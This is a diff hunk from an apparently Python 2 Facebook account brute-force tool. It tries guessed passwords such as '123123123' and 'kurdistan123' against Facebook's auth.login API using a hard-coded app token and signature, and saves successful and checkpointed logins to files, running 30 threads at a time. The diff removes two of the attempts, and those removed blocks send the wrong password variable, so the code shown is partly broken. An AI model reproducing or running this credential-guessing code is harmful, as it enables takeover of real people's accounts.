@@ -208,42 +208,8 @@ def action():
                 cps.write(k + c + user + '>>>' + pass5 + '\n')
                 cps.close()
                 cpb.append(c + user + pass5) 
-            else:
-                pass6 = '123123123'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass6 + '\n')
-                okb.close()
-                oks.append(c + user + pass6)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass6 + '\n')
-                cps.close()
-                cpb.append(c + user + pass6)
-            else:
-                pass7 = 'kurdistan123'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass7 + '\n')
-                okb.close()
-                oks.append(c + user + pass7)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass7 + '\n')
-                cps.close()
-                cpb.append(c + user + pass7) 
-
         except:
             pass
-
     p = ThreadPool(30)
     p.map(main, id)
     print 42 * '\x1b[1;91m='
